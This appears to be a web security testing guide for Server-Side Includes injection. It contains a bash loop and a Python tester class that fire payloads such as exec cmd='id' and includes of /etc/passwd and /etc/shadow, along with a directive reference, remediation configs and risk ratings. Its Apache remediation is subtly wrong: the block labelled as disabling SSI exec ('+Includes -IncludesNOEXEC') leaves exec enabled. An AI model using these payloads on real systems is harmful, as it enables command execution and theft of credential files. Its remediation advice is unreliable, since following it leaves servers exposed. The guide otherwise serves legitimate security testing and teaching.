# WSTG-INPV-08: Testing for SSI Injection

## Test ID
WSTG-INPV-08

## Test Name
Testing for SSI Injection

## High-Level Description

Server-Side Includes (SSI) Injection occurs when an attacker can inject SSI directives into web pages that are processed by the web server. SSI allows embedding dynamic content into HTML pages, and successful injection can lead to arbitrary command execution, file disclosure, or other server-side attacks.

---

## What to Check

- [ ] SSI directive injection
- [ ] File inclusion via SSI
- [ ] Command execution via SSI
- [ ] Virtual includes
- [ ] .shtml, .stm, .shtm extensions
- [ ] XBitHack configuration

---

## How to Test

### Step 1: Identify SSI Processing

```bash
#!/bin/bash
TARGET="https://target.com"

# Check for SSI file extensions
echo "[*] Checking for SSI-enabled files..."
for ext in shtml stm shtm; do
    curl -s -o /dev/null -w "%{http_code}" "$TARGET/index.$ext"
done

# Test SSI injection
echo "[*] Testing SSI injection..."

SSI_PAYLOADS=(
    '<!--#echo var="DATE_LOCAL" -->'
    '<!--#exec cmd="id" -->'
    '<!--#include virtual="/etc/passwd" -->'
    '<!--#printenv -->'
)

for payload in "${SSI_PAYLOADS[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    response=$(curl -s "$TARGET/page?input=$encoded")
    echo "Payload: $payload"
    echo "Response: ${response:0:200}"
done
```

### Step 2: SSI Injection Tester

```python
#!/usr/bin/env python3
"""
SSI Injection Vulnerability Tester
"""

import requests
from urllib.parse import quote

class SSIInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # SSI injection payloads
    SSI_PAYLOADS = {
        'detection': [
            '<!--#echo var="DATE_LOCAL" -->',
            '<!--#echo var="DOCUMENT_NAME" -->',
            '<!--#echo var="SERVER_SOFTWARE" -->',
            '<!--#printenv -->',
        ],
        'file_inclusion': [
            '<!--#include virtual="/etc/passwd" -->',
            '<!--#include file="/etc/passwd" -->',
            '<!--#include virtual="/.htpasswd" -->',
            '<!--#include virtual="/etc/shadow" -->',
        ],
        'command_execution': [
            '<!--#exec cmd="id" -->',
            '<!--#exec cmd="whoami" -->',
            '<!--#exec cmd="cat /etc/passwd" -->',
            '<!--#exec cgi="/cgi-bin/script.cgi" -->',
        ],
        'config': [
            '<!--#config timefmt="%Y" -->',
            '<!--#config errmsg="SSI_TEST" -->',
        ],
    }

    def test_ssi_detection(self, param='input'):
        """Test if SSI is processed"""
        print("\n[*] Testing SSI detection...")

        for payload in self.SSI_PAYLOADS['detection']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check for SSI output indicators
                indicators = [
                    'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun',  # DATE
                    'Apache', 'nginx', 'IIS',  # SERVER_SOFTWARE
                    'DOCUMENT_ROOT', 'SERVER_NAME',  # printenv
                ]

                for indicator in indicators:
                    if indicator in response.text and payload not in response.text:
                        print(f"[VULN] SSI is being processed!")
                        print(f"  Payload: {payload}")
                        self.findings.append({
                            'type': 'SSI Processing Detected',
                            'payload': payload,
                            'severity': 'High'
                        })
                        return True

                # Check if payload is reflected raw (not processed)
                if payload in response.text:
                    print(f"[INFO] SSI payload reflected but not processed")

            except Exception as e:
                pass

        return False

    def test_file_inclusion(self, param='input'):
        """Test SSI file inclusion"""
        print("\n[*] Testing SSI file inclusion...")

        for payload in self.SSI_PAYLOADS['file_inclusion']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check for /etc/passwd content
                if 'root:' in response.text:
                    print(f"[VULN] SSI File Inclusion!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'SSI File Inclusion',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_command_execution(self, param='input'):
        """Test SSI command execution"""
        print("\n[*] Testing SSI command execution...")

        for payload in self.SSI_PAYLOADS['command_execution']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check for command output indicators
                if 'uid=' in response.text or 'gid=' in response.text:
                    print(f"[VULN] SSI Command Execution!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'SSI Command Execution',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("SSI INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo SSI injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                print(f"  Payload: {f['payload']}")

    def run_tests(self, param='input'):
        """Run all SSI tests"""
        self.test_ssi_detection(param)
        self.test_file_inclusion(param)
        self.test_command_execution(param)
        self.generate_report()

# Usage
tester = SSIInjectionTester("https://target.com/page.shtml")
tester.run_tests()
```

### Step 3: SSI Directive Reference

```apache
# SSI Directives

# Echo - Display variables
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="LAST_MODIFIED" -->
<!--#echo var="SERVER_SOFTWARE" -->

# Include - Include files
<!--#include virtual="/header.html" -->
<!--#include file="footer.html" -->

# Exec - Execute commands/CGI
<!--#exec cmd="ls -la" -->
<!--#exec cgi="/cgi-bin/counter.cgi" -->

# Config - Configure SSI behavior
<!--#config timefmt="%A %B %d, %Y" -->
<!--#config sizefmt="bytes" -->
<!--#config errmsg="Error occurred" -->

# Printenv - Print environment
<!--#printenv -->

# Set - Set variables
<!--#set var="name" value="John" -->

# If/Elif/Else - Conditionals
<!--#if expr="${QUERY_STRING} = 'admin'" -->
Admin content
<!--#endif -->

# Flastmod - File last modified
<!--#flastmod virtual="/file.html" -->

# Fsize - File size
<!--#fsize file="document.pdf" -->
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Parameter fuzzing |
| curl | Manual testing |
| Custom scripts | Automated testing |

---

## Remediation

```apache
# Apache - Disable SSI exec
<Directory "/var/www/html">
    Options +Includes -IncludesNOEXEC
</Directory>

# Or disable SSI entirely
<Directory "/var/www/html">
    Options -Includes
</Directory>

# Restrict SSI to specific files
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
```

```nginx
# Nginx - Disable SSI
ssi off;

# Or restrict
ssi on;
ssi_types text/html;
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| SSI command execution | 9.8 | Critical |
| SSI file inclusion | 7.5 | High |
| SSI information disclosure | 5.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-97** | Improper Neutralization of Server-Side Includes (SSI) |

---

## Checklist

```
[ ] SSI file extensions identified
[ ] SSI processing tested
[ ] File inclusion tested
[ ] Command execution tested
[ ] Environment disclosure tested
[ ] Findings documented
```
